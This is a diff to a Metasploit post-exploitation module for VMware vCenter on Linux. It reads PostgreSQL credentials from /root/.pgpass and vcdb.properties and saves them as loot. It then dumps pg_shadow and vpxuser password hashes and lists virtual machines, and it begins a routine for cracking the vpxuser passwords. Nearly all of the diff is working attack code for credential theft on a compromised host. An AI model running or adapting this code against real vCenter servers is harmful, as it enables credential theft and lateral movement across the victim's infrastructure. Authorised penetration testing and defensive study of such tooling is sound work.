@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Post
         This module gathers PostgreSQL passwords and hashes from VMware vCenter servers running on Linux.
       },
       'License'      => MSF_LICENSE,
-      'Platform'     => ['linux'],
+      'Platform'     => ['linux', 'unix'],
       'SessionTypes' => ['meterpreter','shell'],
       'Author'       => [
         'Erik Wynter', # @wyntererik
@@ -24,8 +24,8 @@ class MetasploitModule < Msf::Post
       'Actions' => [
         [ 'HASHDUMP', { 'Description' => 'Dump the PostgreSQL usernames and password hashes' } ],
         [ 'CUSTOM_QUERY', { 'Description' => 'Run a custom PostgreSQL query against the embedded database' } ],
-        [ 'SCHEMADUMP', { 'Description' => 'Dump all database schemas (no data) using pg_dumpall' } ],
         [ 'VPXUSER_HASHDUMP', { 'Description' => 'Dump the password hashes for the vpxuser from the VCDB' } ],
+        [ 'VPXV_VMS', { 'Description' => 'Print information about virtual machines located on the server' } ],
       ],
       'DefaultAction' => 'HASHDUMP',
     )
@@ -41,10 +41,15 @@ class MetasploitModule < Msf::Post
     '/root/.pgpass'
   end
 
+  def vcdb_properties
+    '/etc/vmware-vpx/vcdb.properties'
+  end
+
   def display_results
     datastore['DISPLAY_RESULTS']
   end
-    def query
+
+  def query
     datastore['QUERY']
   end
 
@@ -74,8 +79,65 @@ class MetasploitModule < Msf::Post
     data
   end
 
-  def parse_pgpass(pgpass, db)
-    pgpass.split("\n").each do |line|
+  def grab_db_creds
+    if is_root?
+      res_code, res_contents = grab_db_creds_from_file('postgres', pgpass)
+      case res_code
+      when 0 # try to parse the file
+        return parse_pgpass(res_contents, query_db)
+      when 1 # give up
+        return [res_code, res_contents]
+      when 2 # try to get the VC user creds from /etc/vmware-vpx/vcdb.properties
+        print_warning(res_contents)
+      end
+    end
+
+    res_code, res_contents = grab_db_creds_from_file('vc', vcdb_properties)
+    if res_code == 1
+      return [res_code, res_contents]
+    end
+
+    parse_vcdb_properties(res_contents)
+  end
+
+  def grab_db_creds_from_file(username, creds_file)
+    print_status("Trying to retrieve the #{username} DB credentials from #{creds_file}")
+    success = false
+    if file_exist?(creds_file)
+      file_contents = load_file(creds_file)
+      if file_contents.blank?
+        error_message = "Cannot connect to the DB as the #{username} user: #{creds_file} is empty or could not be read."
+      else
+        success = true       
+        # let's save the contents
+        if creds_file == pgpass
+          filename = 'pgpass'
+        else
+          filename = 'vcdb_properties'
+        end
+        path = store_loot(filename, 'text/plain', session, file_contents, "vcenter_#{filename}.txt")
+        print_good("Saving the #{creds_file} contents to #{path}")
+      end
+    else
+      error_message = "Cannot connect to the DB as the #{username} user: #{creds_file} does not exist."
+    end
+
+    if success
+      return [0, file_contents]
+    end
+
+    # if we were tryging to read the pgpass file but we don't necessarily need root (since the action is not HASHDUMP), we should try to get vc user pass from vcdb_properties
+    if creds_file == pgpass && action.name != 'HASHDUMP'
+      error_code = 2
+    else
+      error_code = 1
+    end
+
+    [error_code, error_message]
+  end
+
+  def parse_pgpass(contents, db)
+    contents.split("\n").each do |line|
       # example of pgpass line format: localhost:5432:VCDB:postgres:mypassword
       pghost, pgport, pgdb, pguser, pgpass = line.split(':')
       next if [pghost, pgport, pgdb, pguser, pgpass].any? {|i| i.blank?}
@@ -84,18 +146,72 @@ class MetasploitModule < Msf::Post
   
       # we want to save only one configuration per database, since by default they all work
       # we don't actually need the password since the server will read this from the .pgpass file
-      if db == 'any'
-        # by default the postgres and VCDB databases are configured with the same password for the 'postgres' user
-        if pgdb == 'postgres' || pgdb == 'VCDB'
-          return [pghost, pgport, pgdb, pguser]
+      if db == pgdb
+        return [0, [pghost, pgport, pguser]]
+      end
+    end
+    [1, "Failed to obtain credentials for the #{query_db} databse from the #{pgpass} file."]
+  end
+
+  def parse_vcdb_properties(contents)
+    pghost = nil
+    pgport = nil
+    pgdb = nil
+    pguser = nil
+    pgpass = nil
+    contents.split("\n").each do |line|
+      case line
+      when /^url = /
+        pghost, pgport, pgdb = line.scan(/postgresql:\/\/(.*?):(.*?)\/(.*?)$/)&.flatten
+        if pghost.nil? || pghost.empty?
+          print_warning("Failed to obtain the postgresql hostname from #{vcdb_properties}. Using the default 'localhost', though this may not work.")
+          pghost = 'localhost'
         end
-      else
-        if db == pgdb
-          return [pghost, pgport, pgdb, pguser]
+        if pgport.nil? || pgport.empty?
+          print_warning("Failed to obtain the postgresql port from #{vcdb_properties}. Using the default '5432', though this may not work.")
+          pgport = '5432'
+        end
+        if pgdb.nil? || pgdb.empty?
+          print_warning("Failed to obtain the postgresql database from #{vcdb_properties}. Using the default 'VCDB', though this may not work.")
+          pgport = 'VCDB'
+        end
+      when /^username = /
+        pguser = line.split('username = ')[1]
+        if pguser.nil? || pguser.empty?
+          print_warning("Failed to obtain the postgresql username from #{vcdb_properties}. Using the default 'vc', though this may not work.")
+          pguser = 'vc'
+        end
+      when /^password = /
+        pgpass = line.split('password = ')[1]
+      when /^password.encrypted = /
+        if !line.end_with?('false') # if password encryption is not off, we can't proceed
+          return [1, "Failed to obtained database credentials from #{vcdb_properties} because the password appears to be encrypted."]
         end
       end
     end
-    [] # let's always return an array so we don't need to worry about the data type
+
+    if pgpass.nil? || pgpass.empty?
+      return [1, "Failed to obtained database credentials from #{vcdb_properties}."]
+    end
+
+    if pgdb != query_db
+      print_warning("Failed to obtain credentials for the #{query_db}. Using credentials for the #{pgdb} database instead. This may not work.")
+    end
+
+    [0, [pghost, pgport, pguser, pgpass]]
+  end
+
+  def grab_query
+    case action.name
+    when 'HASHDUMP'
+      return 'SELECT usename, passwd FROM pg_shadow;'
+    when 'CUSTOM_QUERY'
+      return query
+    when 'VPXUSER_HASHDUMP'
+      return 'SELECT user_name, password, local_ip_address, dns_name FROM VPX_HOST;'
+    when 'VPXV_VMS'
+      return 'SELECT vmid, name, configfilename, guest_state, is_template FROM vpxv_vms;'
+    end
   end
 
   def grab_bin
@@ -131,65 +247,14 @@ class MetasploitModule < Msf::Post
     fail_with(Failure::NoTarget, "Cannot connect to the DB: Did not find a psql binary to use")  
   end
 
-  def dump_schema(bin_name, db_config)
-    pghost, pgport, pgdb, pguser = db_config
-    query_prefix = "export PGPASSFILE='/root/.pgpass'; #{bin_name} -h #{pghost} -p #{pgport} -U #{pguser} -w"
-    pg_schema = []
-
-    # list databases
-    query_result = cmd_exec("#{query_prefix} -c 'SELECT datname FROM pg_database'")
-    return if query_result == 1
-    database_names = query_result.scan(/\n---+\n(.*?)\n\(\d+\srows/m)&.flatten&.first
-    return if database_names.nil?
-
-    database_names.split("\n").each do |database_name|
-      database_name = database_name.strip
-      tmp_db = {}
-      tmp_db['DBName'] = database_name
-      print_status("Enumerating database schema for: #{database_name}")
-      tmp_db['Schemas'] = []
-      query_prefix_db = "#{query_prefix} -d #{database_name}"
-
-      # list schemas for the current database
-      query_result = cmd_exec(%(#{query_prefix_db} -c 'SELECT nspname FROM pg_catalog.pg_namespace;'))
-      next if query_result.blank? || query_result.include?('(0 rows)')
-      tmp_schemanames = query_result.scan(/\n-+\n(.*?)\n\(\d+ rows\)/m)&.flatten&.first
-      next if tmp_schemanames.blank?
-      tmp_schemanames.split("\n").each do |schema_name|
-        schema_name = schema_name.strip
-        tmp_schema = {}
-        tmp_schema['SchemaName'] = schema_name
-        tmp_schema['Tables'] = []
-
-        # list tables for the current schema
-        query_result = cmd_exec(%(#{query_prefix_db} -c "SELECT table_name FROM information_schema.tables WHERE table_schema = '#{schema_name}'"))
-        next if query_result.blank? || query_result.include?('(0 rows)')
-        tmp_tblnames = query_result.scan(/\n-+\n(.*?)\n\(\d+ rows\)/m)&.flatten&.first
-        next if tmp_tblnames.blank?
-        tmp_tblnames.split("\n").each do |tblname|
-          tmp_schema['Tables'] << tblname.strip
-        end 
-        tmp_db['Schemas'] << tmp_schema
-      end
-      pg_schema << tmp_db
-    end
-
-    if display_results
-      print_status("Schemadump:\n#{pg_schema.to_yaml}")
-    end
-    path = store_loot('vcenter_dbschema', 'text/plain', session, pg_schema.to_yaml, 'vcenter_dbschema.yml')
-    print_good("Saving schemadump in YAML format to #{path}")
-  end
-
   def perform_action(bin_name, db_config, cmd)
-    pghost, pgport, pgdb, pguser = db_config
-    if action.name == 'SCHEMADUMP'
-      return dump_schema(bin_name, db_config)
+    pghost, pgport, pguser, pgpass = db_config
+    if pgpass.nil?      
+      full_cmd = "export PGPASSFILE='/root/.pgpass'; #{bin_name} -h #{pghost} -p #{pgport} -d #{query_db} -U #{pguser} -w -c '#{cmd}'"
+    else
+      full_cmd = "export PGPASSWORD='#{pgpass}'; #{bin_name} -h #{pghost} -p #{pgport} -d #{query_db} -U #{pguser} -w -c '#{cmd}'"
     end
-
-    full_cmd = "export PGPASSFILE='/root/.pgpass'; #{bin_name} -h #{pghost} -p #{pgport} -d #{pgdb} -U #{pguser} -w -c '#{cmd}'" # this doesn't work without exporting pgpass
     print_status("Running command: #{full_cmd}")
-
     process_result(cmd_exec(full_cmd))
   end
 
@@ -210,24 +275,57 @@ class MetasploitModule < Msf::Post
     case action.name
     when 'CUSTOM_QUERY'
       loot_name = 'vcenter_query'
-      message_name = 'query'
     when 'HASHDUMP'
       loot_name = 'vcenter_hashdump'
-      message_name = 'hashdump'
     when 'VPXUSER_HASHDUMP'
       loot_name = 'vcenter_vpxdump'
-      message_name = 'vpxuser hashdump'
+    when 'VPXV_VMS'
+      loot_name = 'vcenter_vpxv_vms'
     end
     path = store_loot(loot_name, 'text/plain', session, query_result, "#{loot_name}.txt")
-    print_good("Saving #{message_name} result to #{path}")
+    print_good("Saving #{action.name} result to #{path}")
+
+    query_result
+  end
+
+  def crack_vpxuser_passwords(query_result)
+    query_lines = query_result.split("\n")
+    # check if actually received any results. We should have at least 4 lines, since the first two lines contain the table headers, and the last one the number of rows
+    return 1 unless query_lines.length >= 4
+    
+    cred_lines = query_result.split("\n")[2..-2]
+    print_status("Attempting to crack the #{cred_lines.length} vpxuser passwords we have obtained.")
+    cred_lines.each do |cline|
+      username, hash, local_ip, dns_name = cline.split(/\s+\|\s+/)
+      hash = hash.split('*')[1..].join
+      username = username.strip
+      # we need values for all 4 variables for the creds to be useable
+      return 1 if [username, hash, local_ip, dns_name].any? {|i| i.nil? || i.empty? }
+
+      # TODO: use magic to crack passwords
+    end
   end
 
   def run
     unless is_root?
-      fail_with(Failure::NoAccess, 'This module requires root privileges!')
+      if action.name == 'HASHDUMP'
+        fail_with(Failure::NoAccess, 'The HASHDUMP action requires root privileges!')
+      end
+
+      print_warning("Not running as root, some actions may not work!")
     end
 
-    unless sysinfo['OS'].include?('VMware Photon')
+    if action.name == 'VPXUSER_HASHDUMP' && query_db != 'VCDB'
+      fail_with(Failure::BadConfig, 'The VPXUSER_HASHDUMP action is only compatible with the VCDB database. You can change the database to query via the QUERY_DB option.')
+    end
+
+    # check the OS name to see if are likely dealing with vCenter
+    if session.type == "meterpreter"
+      os_name = sysinfo['OS']
+    else
+      os_name = cmd_exec('grep -w NAME= /etc/os-release | cut -d "=" -f 2-')
+    end
+    unless os_name && os_name.include?('VMware Photon')
       fail_with(Failure::NoTarget, "Target is not a VMware vCenter Server.")
     end
 
@@ -235,47 +333,20 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::BadConfig, 'Please specify a query to run when using the "CUSTOM_QUERY" action.')
     end
 
-    print_status("Trying to retrieve /root/.pgpass")
-    unless file_exist?(pgpass)
-      fail_with(Failure::NoTarget, "Cannot connect to the DB: #{pgpass} doesn't exist on target.")
+    res_code, db_config_or_error_msg = grab_db_creds
+    if res_code == 1
+      fail_with(Failure::NoTarget, db_config_or_error_msg)
     end
-
-    pgpass_contents = load_file(pgpass)
-    if pgpass_contents.blank?
-      fail_with(Failure::NoTarget, "Cannot connect to the DB: #{pgpass} is empty or could not be read.")
-    end
-
-    # let's save this in any case, even if it doesn't contain the creds we are looking for
-    path = store_loot('vcenter_pgpass', 'text/plain', session, pgpass_contents, 'vcenter_pgpass.txt')
-    print_good("Saving #{pgpass} to #{path}")
 
     # identify the binary to use for connecting to the database
-    # TODO: remove bin_name and just hardcode psql everywhere
-    case action.name
-    when 'HASHDUMP'
-      cmd = 'SELECT usename, passwd FROM pg_shadow;'
-      db = 'any'
-    when 'CUSTOM_QUERY'
-      cmd = query
-      db = query_db
-    when 'SCHEMADUMP'
-      db = 'any'
-    when 'VPXUSER_HASHDUMP'
-      cmd = 'SELECT user_name, password, local_ip_address, dns_name from VPX_HOST;'
-      db = 'VCDB'
-    end
-
-    # grab the configuratoins for the relevant database
-    db_config = parse_pgpass(pgpass_contents, db)
-    if db_config.empty?
-      fail_with(Failure::NoTarget, "Cannot connect to the DB: #{pgpass} did not contain credentials that can be leveraged by this module.")
-    end
-
     vprint_status("Locating the psql binary...")
     bin_to_use = grab_bin
     vprint_status("Found psql binary at #{bin_to_use}")
 
-    perform_action(bin_to_use, db_config, cmd)
+    query_result = perform_action(bin_to_use, db_config_or_error_msg, grab_query)
+    # if we obtained the VPXUSER passwords, let's see if we have the privileges to decrypt them    
+    if action.name == 'VPXUSER_HASHDUMP' && is_root?
+      crack_vpxuser_passwords(query_result)
+    end
   end
 end
-
